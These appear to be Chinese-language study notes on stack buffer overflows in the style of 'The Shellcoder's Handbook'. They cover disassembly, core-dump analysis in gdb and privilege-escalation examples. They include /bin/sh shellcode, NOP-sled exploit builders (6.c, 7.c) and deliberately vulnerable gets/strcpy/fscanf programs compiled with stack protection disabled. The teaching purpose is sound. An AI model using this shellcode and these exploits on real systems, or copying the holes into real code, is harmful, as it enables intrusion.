# Ch1

## C函數
```
int triangle (int width, int height){
   int array[5] = {0,1,2,3,4};
   int area;
   area = width * height/2;
   return (area);
}
```
## 對應的組合語言程式
```
0x8048430 <triangle>: push %ebp
0x8048431 <triangle+1>: mov %esp, %ebp
0x8048433 <triangle+3>: push %edi
0x8048434 <triangle+4>: push %esi
0x8048435 <triangle+5>: sub $0x30,%esp
0x8048438 <triangle+8>: lea 0xffffffd8(%ebp), %edi
0x804843b <triangle+11>: mov $0x8049508,%esi
0x8048440 <triangle+16>: cld
0x8048441 <triangle+17>: mov $0x30,%esp
0x8048446 <triangle+22>: repz movsl %ds:( %esi), %es:( %edi)
0x8048448 <triangle+24>: mov 0x8(%ebp),%eax
0x804844b <triangle+27>: mov %eax,%edx
0x804844d <triangle+29>: imul 0xc(%ebp),%edx
0x8048451 <triangle+33>: mov %edx,%eax
0x8048453 <triangle+35>: sar $0x1f,%eax
0x8048456 <triangle+38>: shr $0x1f,%eax
0x8048459 <triangle+41>: lea (%eax, %edx, 1), %eax
0x804845c <triangle+44>: sar %eax
0x804845e <triangle+46>: mov %eax,0xffffffd4(%ebp)
0x8048461 <triangle+49>: mov 0xffffffd4(%ebp),%eax
0x8048464 <triangle+52>: mov %eax,%eax
0x8048466 <triangle+54>: add $0x30,%esp
0x8048469 <triangle+57>: pop %esi
0x804846a <triangle+58>: pop %edi
0x804846b <triangle+59> pop %ebp
0x804846c <triangle+60>: ret
```

# Chapter 2: Stack Overflows.[新版]
```


```
# Chapter 2: Stack Overflows.[舊版]

## buffer.c
```
#include <stdio.h>
#include <string.h>

int main () 
{
    int array[5] = {1, 2, 3, 4, 5};    
    printf("%d\n", array[5] );
}
```
```
cat test1.c 
#include <stdio.h>
#include <string.h>

int main () 
{
    int array[5] = {1, 2, 3, 4, 5};    
  //  printf("%d\n", array[5] );
    printf("%d\n", array[4] );
}


編譯==> gcc test1.c -o test1
執行 ==> ./test1
```

## buffer2.c
```
int main () 
{
   int array[5];
   int i;

   for (i = 0; i <= 255; i++ )
   {
      array[i] = 10;
   }
}

```
```
編譯==>  gcc test2.c -o test2
執行 ==> ./test2
```

## Function and The stack

## 3.c
```
# include <stdio.h>
# include <string.h>

void function(int a, int b){
     int array[5];
}

main()
{
 function(1,2);

 printf("This is where the return address points”);
}
```
```
gcc -g  -mpreferred-stack-boundary=2 -ggdb 3.c -o 3
```
```
gdb ./3
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./3...done.
```

```
(gdb) disas main   ==> 反組譯 main()
Dump of assembler code for function main:
   0x08048490 <+0>:	push   %ebp
   0x08048491 <+1>:	mov    %esp,%ebp
   0x08048493 <+3>:	push   $0x2   ==> 參數傳遞2 function(1,2)
   0x08048495 <+5>:	push   $0x1   ==> 參數傳遞1 function(1,2)
   0x08048497 <+7>:	call   0x804846b <function> ==> 函數呼叫 function(1,2)
   0x0804849c <+12>:	add    $0x8,%esp
   0x0804849f <+15>:	push   $0x8048540
   0x080484a4 <+20>:	call   0x8048330 <printf@plt>
   0x080484a9 <+25>:	add    $0x4,%esp
   0x080484ac <+28>:	mov    $0x0,%eax
   0x080484b1 <+33>:	leave  
   0x080484b2 <+34>:	ret    
End of assembler dump.
```



## 4.c
```
# include <stdio.h>
# include <string.h>

void return_input (void){ 
        char array[30]; 

        gets (array); 
        printf("%s\n", array); 

}


int main() { 
        return_input(); 

        return 0; 

}
```
```
gcc -g  -mpreferred-stack-boundary=2 -ggdb 4.c -o 4

4.c: In function ‘return_input’:
4.c:7:9: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
         gets (array); 
         ^
/tmp/ccDtRgm3.o: In function `return_input':
/home/ksu/shellcoder/4.c:7: warning: the `gets' function is dangerous and should not be used.


https://stackoverflow.com/questions/1214365/disable-warning-the-gets-function-is-dangerous-in-gcc-through-header-files/27431134#27431134
-fno-stack-protector

```

```
./4  <===程式執行
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  <===輸入40個大寫A
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  <===輸出
Segmentation fault (core dumped) <=== 當機
```
### Crashes and Core Dumps
```
A “core dump” is a snapshot of memory at the instant the program crashed, typically saved in a file called “core”. 
GDB can read the core dump and give you the line number of the crash, the arguments that were passed, and more. 
This is very helpful, but remember to compile with (-g) or the core dump will be difficult to debug.

https://betterexplained.com/articles/debugging-with-gdb/
```
### 配置作業系統使其產生core檔案
```
首先通過ulimit命令檢視一下系統是否配置支援了dump core的功能。
通過ulimit -c或ulimit -a，可以檢視core file大小的配置情況，
如果為0，則表示系統關閉了dump core。
可以通過ulimit -c unlimited來開啟。
若發生了段錯誤，但沒有core dump，是由於系統禁止core檔案的生成。

解決方法:
$ulimit -c unlimited　　（只對當前shell程序有效）
或在~/.bashrc　的最後加入： ulimit -c unlimited （一勞永逸）

For the core file to be produced, we need to configure the RLIMIT_CORE (core file size) resource limit for the process, 
which is set to 0 by default.

To change this setting we can use the ulimit command:

# ulimit -c unlimited
```

### linux ulimit使用技術[簡單作業]
```
https://linuxhint.com/linux_ulimit_command/

ulimit -a
 
 
core file size          (blocks, -c) unlimited
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) unlimited
pending signals                 (-i) 15684
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024
pipe size            (512 bytes, -p) 8
POSIX message queues     (bytes, -q) 819200
real-time priority              (-r) 0
stack size              (kbytes, -s) 8192
cpu time               (seconds, -t) unlimited
max user processes              (-u) 15684
virtual memory          (kbytes, -v) unlimited
file locks                      (-x) unlimited
```

```
http://www.brendangregg.com/blog/2016-08-09/gdb-example-ncurses.html
```
```
https://codertw.com/%E4%BC%BA%E6%9C%8D%E5%99%A8/155928/


https://stackoverflow.com/questions/1214365/disable-warning-the-gets-function-is-dangerous-in-gcc-through-header-files/27431134#27431134

-fno-stack-protector is an option that allows the gets() function to be used in spite of how unsafe it is.

-Wno-deprecated-declarations turns off the deprecation warning

Here's an example of compiling with gets()

gcc myprogram.c -o myprogram -fno-stack-protector -Wno-deprecated-declarations
```

###  64bit Kali linux 實戰紀錄
```
ulimit -c ulimited

gcc -g 4.c -o 4 -fno-stack-protector

./4
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)

ls
4  4.c  core

gdb ./4  core =====> 使用 gdb 分析 core dump 
GNU gdb (Debian 8.2.1-2) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./4...done.
[New LWP 9238]
Core was generated by `./4'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x000056534cc5516c in return_input () at 4.c:10
10	}
(gdb) info registers   =====> 檢視暫存器的值
rax            0x57                87
rbx            0x0                 0
rcx            0x7faa6240b804      140369769576452
rdx            0x7faa624de8c0      140369770440896
rsi            0x56534e89c670      94915799926384
rdi            0x0                 0
rbp            0x4141414141414141  0x4141414141414141  ===> 被AAA(41) 蓋住了
rsp            0x7fff80da3fe8      0x7fff80da3fe8
r8             0x3                 3
r9             0x77                119
r10            0x56534e89c010      94915799924752
r11            0x246               582
r12            0x56534cc55060      94915770273888
r13            0x7fff80da40d0      140735355175120
r14            0x0                 0
r15            0x0                 0
rip            0x56534cc5516c      0x56534cc5516c <return_input+39>
eflags         0x10246             [ PF ZF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
```


## 權限提升範例
```
// shell.c

#include <stdio.h>
#include <stdlib.h>

int main(){
  char *name[2];

  name[0] = "/bin/sh";
  name[1] = 0x0;
  execve(name[0], name, 0x0);
  exit(0);
}
```
### 32bit Ubuntu 16.04 LTS 實戰
```
ksu@KSU-Ubuntu-1604-32:~/shellcoder$ gcc -g shell.c -o shell
shell.c: In function ‘main’:
shell.c:9:3: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
   execve(name[0], name, 0x0);
   ^
ksu@KSU-Ubuntu-1604-32:~/shellcoder$ ls
3  3.c  4  4.c  shell  shell.c  victim  victim.c
ksu@KSU-Ubuntu-1604-32:~/shellcoder$ ./shell
$ whoami
ksu
$ q
/bin/sh: 2: q: not found
$ exit
ksu@KSU-Ubuntu-1604-32:~/shellcoder$ 
```




## victim.c
```
# include <string.h>

int main(int argc,char *argv[])
{
   char little_array[512];

   if (argc > 1) 
      strcpy(little_array,argv[1]);
}
```


## shellcode.c
```
// shellcode.c
char shellcode[] =    
        "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
 "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
        "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

    
int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}
```
```
// serial.c

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int valid_serial( char *psz )
{
   size_t len = strlen( psz );
   unsigned total = 0;
   size_t i;

   if( len < 10 )
      return 0;

   for( i = 0; i < len; i++ )
   {
      if(( psz[i] < '0' ) || ( psz[i] > 'z' ))
         return 0;

      total += psz[i];
   }

   if( total % 853 == 83 )
      return 1;

   return 0;
}

int validate_serial()
{
   char serial[ 24 ];

   fscanf( stdin, "%s", serial );

   if( valid_serial( serial ))
      return 1;
   else
      return 0;
}

int do_valid_stuff()
{
   printf("The serial number is valid!\n");
   // do serial-restricted, valid stuff here.
   exit( 0 );
}

int do_invalid_stuff()
{
   printf("Invalid serial number!\nExiting\n");
   exit( 1 );
}

int main( int argc, char *argv[] )
{
   if( validate_serial() )
      do_valid_stuff(); // 0x0804863c
   else
           do_invalid_stuff();

   return 0;
}
```




## 5.c
```
char shellcode[] =    
 "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
 "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
 "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

    
int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}
```

## 6.c
```
#include <stdlib.h>

#define offset_size                    0
#define buffer_size                    512

char sc[] =
  "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
  "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
  "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";


unsigned long find_start(void) {
   __asm__("movl %esp,%eax");
}

int main(int argc, char *argv[]) 
{
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=offset_size, bsize=buffer_size;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  addr = find_start() - offset;
  printf("Attempting address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
       *(addr_ptr++) = addr;

  ptr += 4;

  for (i = 0; i < strlen(sc); i++)
          *(ptr++) = sc[i];

  buff[bsize - 1] = '\0';

  memcpy(buff,"BUF=",4);
  putenv(buff);
  system("/bin/bash");
}
```

## 7.c
```
#include <stdlib.h>

 #define DEFAULT_OFFSET                    0
 #define DEFAULT_BUFFER_SIZE             512
 #define NOP                            0x90

 char shellcode[] =

     "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
     "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
     "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";


unsigned long get_sp(void) {
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[]) 
{
  char *buff, *ptr;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i;

  if (argc > 1) bsize  = atoi(argv[1]);
  if (argc > 2) offset = atoi(argv[2]);

  if (!(buff = malloc(bsize))) {
        printf("Can't allocate memory.\n");
        exit(0);
  }

  addr = get_sp() - offset;
  printf("Using address: 0x%x\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
         *(addr_ptr++) = addr;

  for (i = 0; i < bsize/2; i++)
         buff[i] = NOP;

  ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
  for (i = 0; i < strlen(shellcode); i++)
         *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';

  memcpy(buff,"BUF=",4);
  putenv(buff);
  system("/bin/bash");
}
```


